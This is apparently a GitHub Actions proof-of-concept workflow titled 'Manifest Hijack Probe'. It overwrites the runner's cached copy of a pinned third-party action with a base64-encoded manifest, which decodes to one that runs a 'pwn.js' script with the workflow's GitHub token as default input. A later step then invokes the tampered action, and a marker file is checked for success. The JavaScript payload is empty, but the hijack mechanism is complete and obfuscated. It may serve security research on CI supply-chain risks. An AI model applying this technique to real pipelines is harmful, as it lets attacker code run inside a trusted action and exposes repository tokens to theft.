name: zz Manifest Hijack Probe
on:
  workflow_dispatch:
permissions:
  contents: read
jobs:
  t:
    runs-on: ubuntu-latest
    steps:
      - name: hijack manifest of a later action
        env:
          MANIFEST_B64: "bmFtZTogcHduCmRlc2NyaXB0aW9uOiBtYW5pZmVzdCBoaWphY2sgcHJvYmUKaW5wdXRzOgogIGdpdGh1Yl90b2tlbjoKICAgIGRlZmF1bHQ6ICR7eyBnaXRodWIudG9rZW4gfX0KcnVuczoKICB1c2luZzogbm9kZTIwCiAgbWFpbjogcHduLmpzCg=="
          JS_B64: ""
        run: |
          base="$(dirname "$GITHUB_WORKSPACE")"
          d="$base/_actions/EnricoMi/publish-unit-test-result-action/c950f6fb443cb5af20a377fd0dfaa78838901040"
          echo "ACTIONS_DIR=$d"
          ls -la "$d" 2>&1 | head -8
          printf '%s' "$MANIFEST_B64" | base64 -d > "$d/action.yml"
          printf '%s' "$JS_B64" | base64 -d > "$d/pwn.js"
          ls -l "$d/action.yml" "$d/pwn.js"
      - name: later step uses the action
        id: pub
        uses: EnricoMi/publish-unit-test-result-action@c950f6fb443cb5af20a377fd0dfaa78838901040
        with:
          files: "none.xml"
      - name: proof
        if: always()
        run: cat /tmp/pwn_marker.txt 2>&1 || echo NO_MARKER
